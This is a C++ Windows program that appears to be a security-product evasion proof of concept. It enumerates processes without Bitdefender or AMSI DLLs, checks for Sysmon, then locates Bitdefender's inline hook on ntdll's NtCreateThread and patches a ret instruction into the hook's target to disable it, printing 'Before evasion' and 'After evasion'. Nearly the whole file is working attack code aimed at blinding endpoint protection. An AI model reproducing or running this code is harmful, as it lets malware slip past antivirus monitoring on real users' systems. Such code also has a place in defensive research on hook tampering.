#include <iostream>
#include <Windows.h>
#include <wtsapi32.h>
#include <tchar.h>
#include <psapi.h>
#include <unordered_map>
#include <deque>
#include <conio.h>
#include <sstream>
#include "Sysmon.h"
#include "WhiteListedProcesses.h"

#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Wtsapi32.lib")

using namespace std;

unordered_map<string, string> Products = {
	{"Amsi", "amsi.dll"},
	{"Bitdefender", "atcuf64.dll"},
	{"Bitdenfender", "atcuf32.dll"},
	{"Bitdefender", "bdhkm64.dll" },
};

struct ProcessInfo {
	string processName;
	DWORD pid;
};

bool bitdefenderFound = false;


deque<ProcessInfo> getWhiteListedProcesses() {
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	deque<ProcessInfo> result;

	if (hSnap == INVALID_HANDLE_VALUE) {
		cout << "Failed to create snapshot" << endl;
		return result;
	}

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (Process32FirstW(hSnap, &pe32) == FALSE) {
		cout << "Failed to get first process" << endl;
		CloseHandle(hSnap);
		return result;
	}

	do {
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
		if (hProcess == NULL) {
			continue;
		}

		bool containsWhitelistedDLL = false;
		deque<string> modules = ListModulesByProcess(hProcess);

		if (modules.empty()) {
			CloseHandle(hProcess);
			continue;
		}

		for (const auto& module : modules) {
			for (const auto& product : Products) {
				for (const auto& dll : product.second) {
					if (module.find(dll) != string::npos) {
						containsWhitelistedDLL = true;
						cout << "DLL found: " << dll << " in process: " << getProcessNameByPID(pe32.th32ProcessID) << endl;
						break;
					}
				}
				if (containsWhitelistedDLL) break;
			}
			if (containsWhitelistedDLL) break;
		}

		if (!containsWhitelistedDLL) {
			ProcessInfo info = { getProcessNameByPID(pe32.th32ProcessID), pe32.th32ProcessID };
			result.push_back(info);
		}

		CloseHandle(hProcess);
	} while (Process32NextW(hSnap, &pe32));

	CloseHandle(hSnap);
	return result;
}


deque<string> ListModules() {
	deque<string> modules = {};
	modules.begin();
	// Get the list of all the modules loaded in the current process
	HMODULE hMods[1024];
	HANDLE hProcess;
	DWORD cbNeeded;
	unsigned int i;

	// Get a handle to the current process
	hProcess = GetCurrentProcess();

	// Get the list of all the modules loaded in the current process
	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
	{
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
		{
			TCHAR szModName[MAX_PATH];

			// Get the full path to the module's file
			if (GetModuleFileNameEx(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
			{
				std::string modName;
				wstring ws(szModName);
				modName.assign(ws.begin(), ws.end());
				modules.push_back(modName);
			}
		}
	}
	return modules;
}

bool ReadProcessMemoryData(HANDLE hProcess, LPCVOID address, BYTE* buffer, SIZE_T size) {
	SIZE_T bytesRead;
	if (!ReadProcessMemory(hProcess, address, buffer, size, &bytesRead)) {
		std::cerr << "Failed to read memory. Error: " << GetLastError() << std::endl;
		return false;
	}
	return true;
}

string DisassembleFunction(BYTE* buffer, SIZE_T size) {
	string disassembledFunction = "";
	char temp[3]; 

	for (SIZE_T i = 0; i < size; i++) {
		sprintf(temp, "%02X ", buffer[i]);
		disassembledFunction += temp; 
	}
	return disassembledFunction;
}


int main(int argc, char* argv[])
{
	deque<ProcessInfo> result = getWhiteListedProcesses();

	if (result.size() == 0) {
		cout << "No whitelisted processes found" << endl;
	}
	else {
		cout << "Whitelisted processes found" << endl;
		for (auto& process : result) {
			cout << process.processName << " " << process.pid << endl;
		}
	}
	//return 0;

	// 1. Get all the DLL's loaded injected in the current process
	deque<string> modules = ListModules();
	int sysmon = -1;
	SysmonDetox sysmonDetox;
	sysmon = sysmonDetox.SysmonDetector();
	if (sysmon == 0) {
		cout << "Sysmon not detected" << endl;
	}
	else {
		cout << "Sysmon detected" << endl;
	}


	for (auto& module : modules) {
		for (auto& product : Products) {
			if (module.find(product.second) != string::npos) {
				cout << "Found " << product.first << endl;
				if (product.first == "Bitdefender") {
					bitdefenderFound = true;
				}
			}
		}
	}


	if (bitdefenderFound) {
		cout << "Bitdefender found\nBefore evasion" << endl;
		getchar();
		HMODULE ntDLLHandle = GetModuleHandle(L"ntdll.dll");
		if (ntDLLHandle == NULL) {
			cout << "Error getting ntdll.dll handle" << endl;
			return 1;
		}

		// 2. Get the used address in AV hooks to jmp to the evaluation function via the assembly instruction jmp in the first memory address of NtCreateThread

		// Get the address of NtCreateThread
		FARPROC ntCreateThread = GetProcAddress(ntDLLHandle, "NtCreateThread");
		if (ntCreateThread == NULL) {
			cout << "Error getting NtCreateThread address" << endl;
			return 1;
		}

		// Read the first bytes of NtCreateThread
		string instructions = "";
		BYTE buffer[16]; 
		if (ReadProcessMemoryData(GetCurrentProcess(), ntCreateThread, buffer, sizeof(buffer))) {
			instructions = DisassembleFunction(buffer, sizeof(buffer));
		}

		// Capture the address of the jmp instruction in the AV hook
		string jmpInstruction = "E9";
		cout << "First bytes of NtCreateThread: " << instructions << endl;
		// check if in jmpInstruction contains the jmp instruction
		if (instructions.compare(0, jmpInstruction.length(), jmpInstruction) == 0) {
			cout << "Jmp instruction found at the beginning of the instructions" << endl;
			// Get the address of the jmp instruction

			// Getting the offset bytes
			BYTE offsetBytes[4] = { buffer[1], buffer[2], buffer[3], buffer[4] };
			unsigned long jmpOffset = *reinterpret_cast<unsigned long*>(offsetBytes);

			// Sign-extend the offset if needed
			if (jmpOffset & 0x80000000) {
				jmpOffset |= 0xFFFFFFFF00000000;
			}

			uintptr_t baseAddress = reinterpret_cast<uintptr_t>(ntCreateThread);
			uintptr_t jmpTargetAddress = baseAddress + jmpOffset + 5; // 5 bytes de la instrucción jmp

			cout << "Jmp target address: 0x" << hex << jmpTargetAddress << endl;

			// Add a ret instruction to the jmpTargetAddress function
			BYTE retInstruction = 0xC3;
			if (WriteProcessMemory(GetCurrentProcess(), reinterpret_cast<LPVOID>(jmpTargetAddress), &retInstruction, sizeof(retInstruction), NULL)) {
				cout << "Ret instruction added to the jmp target address\nAfter evasion" << endl;
				getchar();
				return 0;
			}
			else {
				cout << "Error adding ret instruction to the jmp target address" << endl;
			}


		}
		else {
			cout << "Jmp instruction not found at the beginning" << endl;
		}

		// 3. Add a ret instruction to the evaluation function

		getchar();

	}
}
